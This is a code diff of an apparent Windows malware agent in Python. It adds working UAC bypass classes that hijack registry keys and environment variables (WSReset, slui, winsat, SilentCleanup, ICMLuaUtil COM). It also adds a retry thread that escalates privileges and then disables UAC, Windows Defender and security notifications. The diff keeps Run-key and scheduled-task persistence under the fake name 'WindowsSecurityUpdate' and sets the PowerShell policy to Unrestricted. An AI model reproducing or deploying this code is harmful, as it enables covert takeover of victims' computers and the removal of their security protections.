+                creationflags=subprocess.CREATE_NO_WINDOW,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+            
+            try:
+                process.communicate(timeout=15)
+            except subprocess.TimeoutExpired:
+                process.kill()
+            
+            time.sleep(3)
+            self.cleanup_registry(key_path)
+            return True
+            
+        except Exception as e:
+            try:
+                self.cleanup_registry(key_path)
+            except:
+                pass
+            raise UACBypassError(f"WSReset bypass failed: {e}")
+
+class SluiBypass(UACBypassMethod):
+    """Enhanced UAC bypass using slui.exe (UACME Method 45)"""
+    
+    def __init__(self):
+        super().__init__(
+            "Slui",
+            "UAC bypass using slui.exe",
+            45
+        )
+    
+    def is_available(self) -> bool:
+        return super().is_available() and os.path.exists(r"C:\Windows\System32\slui.exe")
+    
+    def _execute_bypass(self) -> bool:
+        try:
+            import winreg
+            
+            current_exe = self.get_current_executable()
+            key_path = r"Software\Classes\exefile\shell\open\command"
+            
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+            winreg.CloseKey(key)
+            
+            process = subprocess.Popen(
+                [r"C:\Windows\System32\slui.exe"],
+                creationflags=subprocess.CREATE_NO_WINDOW,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+            
+            try:
+                process.communicate(timeout=10)
+            except subprocess.TimeoutExpired:
+                process.kill()
+            
+            time.sleep(2)
+            self.cleanup_registry(key_path)
+            return True
+            
+        except Exception as e:
+            try:
+                self.cleanup_registry(key_path)
+            except:
+                pass
+            raise UACBypassError(f"Slui bypass failed: {e}")
+
+class WinsatBypass(UACBypassMethod):
+    """Enhanced UAC bypass using winsat.exe (UACME Method 67)"""
+    
+    def __init__(self):
+        super().__init__(
+            "Winsat",
+            "UAC bypass using winsat.exe",
+            67
+        )
+    
+    def is_available(self) -> bool:
+        return super().is_available() and os.path.exists(r"C:\Windows\System32\winsat.exe")
+    
+    def _execute_bypass(self) -> bool:
+        try:
+            import winreg
+            
+            current_exe = self.get_current_executable()
+            key_path = r"Software\Classes\Folder\shell\open\command"
+            
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+            winreg.CloseKey(key)
+            
+            process = subprocess.Popen(
+                [r"C:\Windows\System32\winsat.exe", "disk"],
+                creationflags=subprocess.CREATE_NO_WINDOW,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+            
+            try:
+                process.communicate(timeout=20)
+            except subprocess.TimeoutExpired:
+                process.kill()
+            
+            time.sleep(2)
+            self.cleanup_registry(key_path)
+            return True
+            
+        except Exception as e:
+            try:
+                self.cleanup_registry(key_path)
+            except:
+                pass
+            raise UACBypassError(f"Winsat bypass failed: {e}")
+
+class SilentCleanupBypass(UACBypassMethod):
+    """Enhanced UAC bypass using SilentCleanup scheduled task (UACME Method 34)"""
+    
+    def __init__(self):
+        super().__init__(
+            "SilentCleanup",
+            "UAC bypass using SilentCleanup scheduled task",
+            34
+        )
+    
+    def _execute_bypass(self) -> bool:
+        try:
+            import winreg
+            
+            current_exe = self.get_current_executable()
+            key_path = r"Environment"
+            
+            # Set environment variable
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, "windir", 0, winreg.REG_EXPAND_SZ, f"{current_exe} & ")
+            winreg.CloseKey(key)
+            
+            # Execute SilentCleanup task
+            result = subprocess.run([
+                "schtasks", "/run", "/tn", r"\Microsoft\Windows\DiskCleanup\SilentCleanup"
+            ], capture_output=True, text=True, timeout=30)
+            
+            time.sleep(5)
+            
+            # Clean up
+            self._cleanup_environment()
+            return True
+            
+        except Exception as e:
+            try:
+                self._cleanup_environment()
+            except:
+                pass
+            raise UACBypassError(f"SilentCleanup bypass failed: {e}")
+    
+    def _cleanup_environment(self) -> None:
+        """Clean up environment variable"""
+        try:
+            import winreg
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Environment", 0, winreg.KEY_SET_VALUE)
+            winreg.DeleteValue(key, "windir")
+            winreg.CloseKey(key)
+        except Exception:
+            pass
+
+class ICMLuaUtilBypass(UACBypassMethod):
+    """Enhanced UAC bypass using ICMLuaUtil COM interface (UACME Method 41)"""
+    
+    def __init__(self):
+        super().__init__(
+            "ICMLuaUtil COM",
+            "UAC bypass using ICMLuaUtil COM interface",
+            41
+        )
+    
+    def is_available(self) -> bool:
+        try:
+            import win32com.client
+            import pythoncom
+            return super().is_available()
+        except ImportError:
+            return False
+    
+    def _execute_bypass(self) -> bool:
+        try:
+            import win32com.client
+            import pythoncom
+            
+            pythoncom.CoInitialize()
+            
+            try:
+                lua_util = win32com.client.Dispatch(
+                    "Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
+                )
+                
+                current_exe = self.get_current_executable()
+                lua_util.ShellExec(current_exe, "", "", 0, 1)
+                
+                return True
+                
+            finally:
+                pythoncom.CoUninitialize()
+                
+        except Exception as e:
+            raise UACBypassError(f"ICMLuaUtil COM bypass failed: {e}")
+
+# Global UAC bypass manager instance (lazy-initialized to avoid RLock issues)
+uac_manager = None
+
+def get_uac_manager():
+    """Get or create the UAC bypass manager instance (lazy initialization)"""
+    global uac_manager
+    if uac_manager is None:
+        uac_manager = UACBypassManager()
+    return uac_manager
+
 def is_admin():
     """Check if the current process has admin privileges."""
     if WINDOWS_AVAILABLE:
         try:
-            return ctypes.windll.shell32.IsUserAnAdmin()
-        except (AttributeError, OSError):
+            result = ctypes.windll.shell32.IsUserAnAdmin()
+            if UAC_PRIVILEGE_DEBUG:
+                if result:
+                    debug_print("✅ [ADMIN CHECK] Running as ADMINISTRATOR")
+                else:
+                    debug_print("❌ [ADMIN CHECK] Running as NORMAL USER (not admin)")
+            return result
+        except (AttributeError, OSError) as e:
+            if UAC_PRIVILEGE_DEBUG:
+                debug_print(f"❌ [ADMIN CHECK] Failed to check admin status: {e}")
             return False
     else:
-        return os.geteuid() == 0
+        result = os.geteuid() == 0
+        if UAC_PRIVILEGE_DEBUG:
+            debug_print(f"[ADMIN CHECK] Linux/Unix euid check: {result}")
+        return result
 
-def elevate_privileges():
-    """Attempt to elevate privileges using various advanced methods."""
+def elevate_via_registry_auto_approve():
+    """Automatically approve UAC prompts via registry modification."""
     if not WINDOWS_AVAILABLE:
-        # For Linux/Unix systems
-        try:
-            if os.geteuid() != 0:
-                # Try to use sudo if available
-                subprocess.run(['sudo', '-n', 'true'], check=True, capture_output=True)
-                return True
-        except Exception as e:
-            log_message(f"Failed to check sudo availability: {e}", "warning")
         return False
     
+    try:
+        import winreg
+        
+        # Set UAC to auto-approve for current user (no prompt)
+        reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+        
+        # Try to set in HKCU first (doesn't need admin)
+        try:
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
+            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
+            winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
+            winreg.CloseKey(key)
+            log_message("[REGISTRY] Auto-approve set in HKCU")
+            return True
+        except Exception:
+            pass
+        
+        return False
+    except Exception as e:
+        log_message(f"[REGISTRY] Auto-approve failed: {e}")
+        return False
+
+def keep_trying_elevation():
+    """Background thread that continuously tries to gain admin privileges."""
+    retry_count = 0
+    max_retries = 10
+    retry_interval = 30  # seconds
+    
+    log_message("[ELEVATION] Background elevation thread started")
+    
+    while retry_count < max_retries:
+        if is_admin():
+            log_message("✅ [ELEVATION] Successfully gained admin privileges!")
+            # Immediately disable UAC
+            disable_uac()
+            disable_defender()
+            disable_windows_notifications()
+            return
+        
+        retry_count += 1
+        log_message(f"[ELEVATION] Retry {retry_count}/{max_retries} - attempting UAC bypass...")
+        
+        # Try UAC bypass methods again
+        if attempt_uac_bypass():
+            log_message("✅ [ELEVATION] UAC bypass successful on retry {retry_count}!")
+            disable_uac()
+            return
+        
+        # Wait before next retry
+        time.sleep(retry_interval)
+    
+    log_message(f"⚠️ [ELEVATION] Failed to gain admin after {max_retries} attempts")
+
+def attempt_uac_bypass():
+    """Attempt to bypass UAC using the ADVANCED UAC Manager."""
+    debug_print("=" * 80)
+    debug_print("[UAC BYPASS] attempt_uac_bypass() called")
+    debug_print("=" * 80)
+    
+    if not WINDOWS_AVAILABLE:
+        debug_print("❌ [UAC BYPASS] Not Windows - bypass not available")
+        return False
+    
+    debug_print("[UAC BYPASS] Checking if already admin...")
     if is_admin():
+        debug_print("✅ [UAC BYPASS] Already admin - no bypass needed")
+        log_message("[UAC BYPASS] Already running as admin", "info")
         return True
     
-    # Advanced UAC bypass methods (UACME-inspired)
-    bypass_methods = [
-        bypass_uac_cmlua_com,           # Method 41: ICMLuaUtil COM interface
-        bypass_uac_fodhelper_protocol,  # Method 33: fodhelper ms-settings protocol
-        bypass_uac_computerdefaults,    # Method 33: computerdefaults registry
-        bypass_uac_dccw_com,           # Method 43: IColorDataProxy COM
-        bypass_uac_dismcore_hijack,    # Method 23: DismCore.dll hijack
-        bypass_uac_wow64_logger,       # Method 30: WOW64 logger hijack
-        bypass_uac_silentcleanup,      # Method 34: SilentCleanup scheduled task
-        bypass_uac_token_manipulation, # Method 35: Token manipulation
-        bypass_uac_junction_method,    # Method 36: NTFS junction/reparse
-        bypass_uac_cor_profiler,       # Method 39: .NET Code Profiler
-        bypass_uac_com_handlers,       # Method 40: COM handler hijack
-        bypass_uac_volatile_env,       # Method 44: Environment variable expansion
-        bypass_uac_slui_hijack,        # Method 45: slui.exe hijack
-        bypass_uac_eventvwr,           # Method 25: EventVwr.exe registry hijacking
-        bypass_uac_sdclt,              # Method 31: sdclt.exe bypass
-        bypass_uac_wsreset,            # Method 56: WSReset.exe bypass
-        bypass_uac_appinfo_service,    # Method 61: AppInfo service manipulation
-        bypass_uac_mock_directory,     # Method 62: Mock directory technique
-        bypass_uac_winsat,             # Method 67: winsat.exe bypass
-        bypass_uac_mmcex,              # Method 68: MMC snapin bypass
-    ]
+    debug_print("[UAC BYPASS] Not admin - starting UAC bypass...")
+    log_message("[UAC BYPASS] Starting ADVANCED UAC bypass using UAC Manager...", "info")
     
-    for method in bypass_methods:
-        try:
-            if method():
-                return True
-        except Exception as e:
-            log_message(f"UAC bypass method {method.__name__} failed: {e}", "error")
-            continue
+    # Use the professional UAC Manager (lazy-initialized)
+    debug_print("[UAC BYPASS] Initializing UAC Manager...")
+    try:
+        manager = get_uac_manager()
+        debug_print(f"✅ [UAC BYPASS] UAC Manager initialized with {len(manager.methods)} methods")
+    except Exception as e:
+        debug_print(f"❌ [UAC BYPASS] UAC Manager initialization FAILED: {e}")
+        import traceback
+        traceback.print_exc()
+        return False
     
-    return False
+    debug_print("[UAC BYPASS] Calling manager.try_all_methods()...")
+    result = manager.try_all_methods()
+    
+    if result:
+        debug_print("=" * 80)
+        debug_print("✅✅✅ [UAC BYPASS] SUCCESS! Admin privileges gained!")
+        debug_print("=" * 80)
+        log_message("✅ [UAC BYPASS] UAC bypass successful via UAC Manager!", "success")
+    else:
+        debug_print("=" * 80)
+        debug_print("❌❌❌ [UAC BYPASS] FAILED! All methods failed!")
+        debug_print("=" * 80)
+        log_message("❌ [UAC BYPASS] All UAC Manager methods failed", "error")
+    
+    return result
+
+# Alias for compatibility
+def elevate_privileges():
+    """Alias for attempt_uac_bypass() - for compatibility."""
+    return attempt_uac_bypass()
 
 def bypass_uac_cmlua_com():
     """UAC bypass using ICMLuaUtil COM interface (UACME Method 41)."""
@@ -1924,16 +2958,20 @@ def registry_run_key_persistence():
     try:
         import winreg
         
-        current_exe = os.path.abspath(__file__)
-        if current_exe.endswith('.py'):
-            current_exe = f'python.exe "{current_exe}"'
+        # Get the executable path - no quotes needed for registry
+        if hasattr(sys, 'frozen') and sys.frozen:
+            current_exe = sys.executable
+        else:
+            current_exe = os.path.abspath(__file__)
+            if current_exe.endswith('.py'):
+                current_exe = f'python.exe "{current_exe}"'
         
         log_message(f"[REGISTRY] Setting up persistence for: {current_exe}")
         
         # Multiple registry locations for persistence
+        # IMPORTANT: Using HKEY_CURRENT_USER (not HKLM) to avoid UAC prompts
         run_keys = [
             (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
-            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
         ]
         
         value_name = "WindowsSecurityUpdate"
@@ -1946,6 +2984,7 @@ def registry_run_key_persistence():
                 log_message(f"[REGISTRY] Key created successfully: {key_path}")
                 
                 log_message(f"[REGISTRY] Setting value '{value_name}' = '{current_exe}'")
+                # Store without extra quotes - registry Run keys handle this correctly
                 winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, current_exe)
                 log_message(f"[REGISTRY] Value set successfully in {key_path}")
                 
@@ -2013,9 +3052,10 @@ def scheduled_task_persistence():
             current_exe = f'python.exe "{current_exe}"'
         
         # Create scheduled task using schtasks command
+        # Use /RL LIMITED to run with normal user privileges (no UAC prompt)
         subprocess.run([
             'schtasks.exe', '/Create', '/TN', 'WindowsSecurityUpdate',
-            '/TR', current_exe, '/SC', 'ONLOGON', '/F'
+            '/TR', current_exe, '/SC', 'ONLOGON', '/RL', 'LIMITED', '/F'
         ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=30)
         
         return True
@@ -2241,17 +3281,17 @@ if __name__ == "__main__":
     monitor_main_script()
 '''
         
-        # Save watchdog script
-        watchdog_path = os.path.join(tempfile.gettempdir(), "svchost32.py")
-        with open(watchdog_path, 'w') as f:
-            f.write(watchdog_script)
+        # DISABLED: Watchdog script to prevent Python window pop-ups
+        # watchdog_path = os.path.join(tempfile.gettempdir(), "svchost32.py")
+        # with open(watchdog_path, 'w') as f:
+        #     f.write(watchdog_script)
+        # 
+        # # Start watchdog process
+        # subprocess.Popen(['python.exe', watchdog_path], 
+        #                 creationflags=subprocess.CREATE_NO_WINDOW)
         
-        # Start watchdog process
-        subprocess.Popen(['python.exe', watchdog_path], 
-                        creationflags=subprocess.CREATE_NO_WINDOW)
-        
-        log_message(f"[OK] File locking persistence established: {watchdog_path}")
-        return True
+        log_message(f"[SKIP] Watchdog persistence disabled to prevent popup windows")
+        return False  # Changed to False to skip this persistence method
         
     except Exception as e:
         log_message(f"File locking persistence failed: {e}")
@@ -2279,16 +3319,17 @@ timeout /t 30 /nobreak >nul
 goto loop
 '''
         
-        watchdog_path = os.path.join(tempfile.gettempdir(), "svchost32.bat")
-        with open(watchdog_path, 'w') as f:
-            f.write(watchdog_batch)
+        # DISABLED: Watchdog batch to prevent popup windows
+        # watchdog_path = os.path.join(tempfile.gettempdir(), "svchost32.bat")
+        # with open(watchdog_path, 'w') as f:
+        #     f.write(watchdog_batch)
+        # 
+        # # Start watchdog
+        # subprocess.Popen(['cmd.exe', '/c', watchdog_path], 
+        #                 creationflags=subprocess.CREATE_NO_WINDOW)
         
-        # Start watchdog
-        subprocess.Popen(['cmd.exe', '/c', watchdog_path], 
-                        creationflags=subprocess.CREATE_NO_WINDOW)
-        
-        log_message(f"[OK] Watchdog persistence established: {watchdog_path}")
-        return True
+        log_message(f"[SKIP] Watchdog batch persistence disabled to prevent popup windows")
+        return False
         
     except Exception as e:
         log_message(f"Watchdog persistence failed: {e}")
@@ -2362,16 +3403,17 @@ if __name__ == "__main__":
     check_and_restore()
 '''
         
-        tamper_path = os.path.join(tempfile.gettempdir(), "tamper_protection.py")
-        with open(tamper_path, 'w') as f:
-            f.write(tamper_script)
+        # DISABLED: Tamper protection to prevent Python window pop-ups
+        # tamper_path = os.path.join(tempfile.gettempdir(), "tamper_protection.py")
+        # with open(tamper_path, 'w') as f:
+        #     f.write(tamper_script)
+        # 
+        # # Start tamper protection
+        # subprocess.Popen(['python.exe', tamper_path], 
+        #                 creationflags=subprocess.CREATE_NO_WINDOW)
         
-        # Start tamper protection
-        subprocess.Popen(['python.exe', tamper_path], 
-                        creationflags=subprocess.CREATE_NO_WINDOW)
-        
-        log_message(f"[OK] Tamper protection established: {tamper_path}")
-        return True
+        log_message(f"[SKIP] Tamper protection disabled to prevent popup windows")
+        return False
         
     except Exception as e:
         log_message(f"Tamper protection failed: {e}")
@@ -2383,29 +3425,25 @@ def disable_removal_tools():
         return False
     
     try:
-        # Set Task Manager registry value to 0 (keep enabled)
-        subprocess.run([
-            'reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
-            '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '1', '/f'
-        ], creationflags=subprocess.CREATE_NO_WINDOW)
+        # Task Manager, Registry Editor, and CMD are now kept ENABLED (not disabled)
+        # These registry entries are set to 0 (enabled) to allow normal system tool usage
+        log_message("[INFO] System tools (Task Manager, Registry Editor, CMD) remain enabled")
         
-        # Set Registry Editor registry value to 0 (keep enabled)
-        subprocess.run([
-            'reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
-            '/v', 'DisableRegistryTools', '/t', 'REG_DWORD', '/d', '1', '/f'
-        ], creationflags=subprocess.CREATE_NO_WINDOW)
-        
-        # Set Command Prompt registry value to 0 (keep enabled)
+        # Set Command Prompt registry value to 0 (ENABLED - FALSE means NOT disabled)
+        debug_print("[REGISTRY] Setting DisableCMD = 0 (CMD ENABLED)")
         subprocess.run([
             'reg', 'add', 'HKCU\\Software\\Policies\\Microsoft\\Windows\\System',
-            '/v', 'DisableCMD', '/t', 'REG_DWORD', '/d', '1', '/f'
+            '/v', 'DisableCMD', '/t', 'REG_DWORD', '/d', '0', '/f'  # ✅ Changed from 1 to 0!
         ], creationflags=subprocess.CREATE_NO_WINDOW)
+        debug_print("[REGISTRY] ✅ CMD remains ENABLED (DisableCMD = 0)")
         
         # Set PowerShell ExecutionPolicy to Unrestricted (keep enabled)
+        debug_print("[REGISTRY] Setting PowerShell ExecutionPolicy to Unrestricted")
         subprocess.run([
             'reg', 'add', 'HKCU\\Software\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell',
             '/v', 'ExecutionPolicy', '/t', 'REG_SZ', '/d', 'Unrestricted', '/f'
         ], creationflags=subprocess.CREATE_NO_WINDOW)
+        debug_print("[REGISTRY] ✅ PowerShell ExecutionPolicy set to Unrestricted")
         
         log_message("[OK] Removal tools registry entries configured (tools remain enabled)")
         return True
@@ -2728,14 +3766,16 @@ if __name__ == "__main__":
     check_and_restore()
 '''
         
-        # Create tamper protection script
-        tamper_script_path = os.path.join(tempfile.gettempdir(), "tamper_protection.py")
-        with open(tamper_script_path, 'w') as f:
-            f.write(tamper_script)
+        # DISABLED: Tamper protection script to prevent Python window pop-ups
+        # tamper_script_path = os.path.join(tempfile.gettempdir(), "tamper_protection.py")
+        # with open(tamper_script_path, 'w') as f:
+        #     f.write(tamper_script)
+        # 
+        # # Start tamper protection in background
+        # subprocess.Popen(['python.exe', tamper_script_path], 
+        #                 creationflags=subprocess.CREATE_NO_WINDOW)
         
-        # Start tamper protection in background
-        subprocess.Popen(['python.exe', tamper_script_path], 
-                        creationflags=subprocess.CREATE_NO_WINDOW)
+        log_message(f"[SKIP] Tamper protection script disabled to prevent popup windows")
         
         log_message("[OK] Tamper protection active")
         
@@ -2852,12 +3892,15 @@ if __name__ == "__main__":
     check_and_restore()
 '''
         
-        tamper_path = os.path.join(tempfile.gettempdir(), "tamper_protection.exe")
+        # DISABLED: Tamper protection executable to prevent popup windows
+        # tamper_path = os.path.join(tempfile.gettempdir(), "tamper_protection.exe")
+        # 
+        # # Create tamper protection executable using PyInstaller
+        # tamper_script_path = os.path.join(tempfile.gettempdir(), "tamper_protection.py")
+        # with open(tamper_script_path, 'w') as f:
+        #     f.write(tamper_script)
         
-        # Create tamper protection executable using PyInstaller
-        tamper_script_path = os.path.join(tempfile.gettempdir(), "tamper_protection.py")
-        with open(tamper_script_path, 'w') as f:
-            f.write(tamper_script)
+        log_message(f"[SKIP] Tamper protection exe disabled to prevent popup windows")
         
         # Build tamper protection executable
         try:
@@ -2906,9 +3949,12 @@ if __name__ == "__main__":
         return False
 
 def disable_defender():
-    """Attempt to disable Windows Defender (requires admin privileges)."""
-    if not WINDOWS_AVAILABLE or not is_admin():
+    """Attempt to disable Windows Defender (tries even without admin)."""
+    if not WINDOWS_AVAILABLE:
         return False
+    
+    # Try to disable Defender even without admin - some methods might work
+    log_message("[DEFENDER] Attempting to disable Windows Defender...")
     
     try:
         # Multiple methods to disable Windows Defender
@@ -3315,13 +4361,14 @@ def setup_scheduled_task_persistence():
         
         task_name = "WindowsSecurityUpdateTask"
         
-        # Create scheduled task
+        # Create scheduled task with /rl limited to avoid UAC prompts
+        # Changed from 'highest' to 'limited' so it runs with normal user privileges
         subprocess.run([
             'schtasks.exe', '/create',
             '/tn', task_name,
             '/tr', current_exe,
             '/sc', 'onlogon',
-            '/rl', 'highest',
+            '/rl', 'limited',
             '/f'
         ], creationflags=subprocess.CREATE_NO_WINDOW)
         
@@ -3406,6 +4453,176 @@ def setup_com_hijacking_persistence():
 
 # Removed duplicate functions - these are already defined above
 
+def disable_windows_notifications():
+    """Disable all Windows notifications and action center."""
+    if not WINDOWS_AVAILABLE:
+        log_message("[NOTIFICATIONS] Windows not available")
+        return False
+    
+    try:
+        import winreg
+        log_message("[NOTIFICATIONS] Disabling Windows notifications...")
+        
+        success_count = 0
+        
+        # 1. Disable Action Center notifications (Current User)
+        try:
+            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "ToastEnabled", 0, winreg.REG_DWORD, 0)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Action Center notifications disabled (HKCU)")
+            success_count += 1
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable Action Center (HKCU): {e}")
+        
+        # 2. Disable notification center entirely (Current User)
+        try:
+            key_path = r"SOFTWARE\Policies\Microsoft\Windows\Explorer"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "DisableNotificationCenter", 0, winreg.REG_DWORD, 1)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Notification Center disabled (HKCU)")
+            success_count += 1
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable Notification Center (HKCU): {e}")
+        
+        # 3. Disable Windows Defender notifications (Current User)
+        try:
+            key_path = r"SOFTWARE\Microsoft\Windows Defender\UX Configuration"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "Notification_Suppress", 0, winreg.REG_DWORD, 1)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Windows Defender notifications disabled (HKCU)")
+            success_count += 1
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable Defender notifications (HKCU): {e}")
+        
+        # 4. Disable toast notifications (Current User)
+        try:
+            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "NOC_GLOBAL_SETTING_ALLOW_TOASTS_ABOVE_LOCK", 0, winreg.REG_DWORD, 0)
+            winreg.SetValueEx(key, "NOC_GLOBAL_SETTING_ALLOW_CRITICAL_TOASTS_ABOVE_LOCK", 0, winreg.REG_DWORD, 0)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Toast notifications disabled (HKCU)")
+            success_count += 1
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable toast notifications (HKCU): {e}")
+        
+        # 5. Try system-wide settings if we have admin privileges
+        try:
+            # Disable notification center system-wide
+            key_path = r"SOFTWARE\Policies\Microsoft\Windows\Explorer"
+            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
+            winreg.SetValueEx(key, "DisableNotificationCenter", 0, winreg.REG_DWORD, 1)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Notification Center disabled system-wide (HKLM)")
+            success_count += 1
+        except PermissionError:
+            log_message("[NOTIFICATIONS] No admin privileges for system-wide settings")
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable notifications system-wide: {e}")
+        
+        # 6. Disable Windows Update notifications (Current User)
+        try:
+            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.WindowsUpdate"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "Enabled", 0, winreg.REG_DWORD, 0)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Windows Update notifications disabled")
+            success_count += 1
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable Windows Update notifications: {e}")
+        
+        # 7. Disable Security and Maintenance notifications (Current User)
+        try:
+            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "Enabled", 0, winreg.REG_DWORD, 0)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Security notifications disabled")
+            success_count += 1
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable Security notifications: {e}")
+        
+        log_message(f"[NOTIFICATIONS] Notification disable completed: {success_count}/7 settings applied")
+        return success_count > 0
+        
+    except Exception as e:
+        log_message(f"[NOTIFICATIONS] Error disabling notifications: {e}")
+        return False
+
+def disable_wsl_routing():
+    """AGGRESSIVE: Disable WSL routing for PowerShell/CMD commands."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        import winreg
+        log_message("[WSL] Disabling WSL command routing...")
+        
+        # Method 1: Remove WSL from PATH environment variable
+        try:
+            current_path = os.environ.get('PATH', '')
+            # Remove any WSL-related paths
+            new_path = ';'.join([p for p in current_path.split(';') 
+                                if 'wsl' not in p.lower() and 'ubuntu' not in p.lower()])
+            os.environ['PATH'] = new_path
+            log_message("[WSL] Removed WSL from PATH environment")
+        except Exception as e:
+            log_message(f"[WSL] Failed to modify PATH: {e}")
+        
+        # Method 2: Disable WSL via registry (requires admin)
+        try:
+            # Disable WSL feature
+            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss"
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+                winreg.SetValueEx(key, "DefaultDistribution", 0, winreg.REG_SZ, "")
+                winreg.CloseKey(key)
+                log_message("[WSL] Disabled WSL default distribution (HKCU)")
+            except:
+                pass
+            
+            # Try HKLM (needs admin)
+            try:
+                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
+                winreg.SetValueEx(key, "DefaultDistribution", 0, winreg.REG_SZ, "")
+                winreg.CloseKey(key)
+                log_message("[WSL] Disabled WSL default distribution (HKLM)")
+            except:
+                pass
+                
+        except Exception as e:
+            log_message(f"[WSL] Failed to modify WSL registry: {e}")
+        
+        # Method 3: Force CMD.exe as default shell (AGGRESSIVE!)
+        try:
+            # Set ComSpec to force CMD.exe
+            cmd_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'cmd.exe')
+            os.environ['COMSPEC'] = cmd_path
+            log_message(f"[WSL] Forced COMSPEC to: {cmd_path}")
+        except Exception as e:
+            log_message(f"[WSL] Failed to set COMSPEC: {e}")
+        
+        # Method 4: Remove powershell.exe alias to WSL (if exists)
+        try:
+            # Check for WSL aliases in current directory
+            ps_alias_path = os.path.join(os.getcwd(), 'powershell.exe')
+            if os.path.exists(ps_alias_path) and os.path.islink(ps_alias_path):
+                os.remove(ps_alias_path)
+                log_message("[WSL] Removed powershell.exe WSL alias")
+        except Exception as e:
+            log_message(f"[WSL] Failed to remove alias: {e}")
+        
+        log_message("✅ [WSL] WSL routing disabled successfully!")
+        return True
+        
+    except Exception as e:
+        log_message(f"[WSL] Error disabling WSL routing: {e}")
+        return False
+
 def disable_uac():
     """Disable UAC (User Account Control) by modifying registry settings."""
     if not WINDOWS_AVAILABLE:
@@ -3422,18 +4639,19 @@ def disable_uac():
             log_message("[REGISTRY] UAC registry key opened successfully")
             
             # Set EnableLUA to 0 (disable UAC)
-            log_message("[REGISTRY] Setting EnableLUA = 1")
-            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 1)
+            log_message("[REGISTRY] Setting EnableLUA = 0 (disabling UAC)")
+            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
             log_message("[REGISTRY] EnableLUA set successfully")
             
-            # Set ConsentPromptBehaviorAdmin to 0 (no prompts for administrators)
-            log_message("[REGISTRY] Setting ConsentPromptBehaviorAdmin = 1")
-            winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 1, winreg.REG_DWORD, 1)
+            # Set ConsentPromptBehaviorAdmin to 0 (no password prompts for administrators)
+            # Changed from 1 to 0 to prevent password popup
+            log_message("[REGISTRY] Setting ConsentPromptBehaviorAdmin = 0 (no password prompt)")
+            winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
             log_message("[REGISTRY] ConsentPromptBehaviorAdmin set successfully")
             
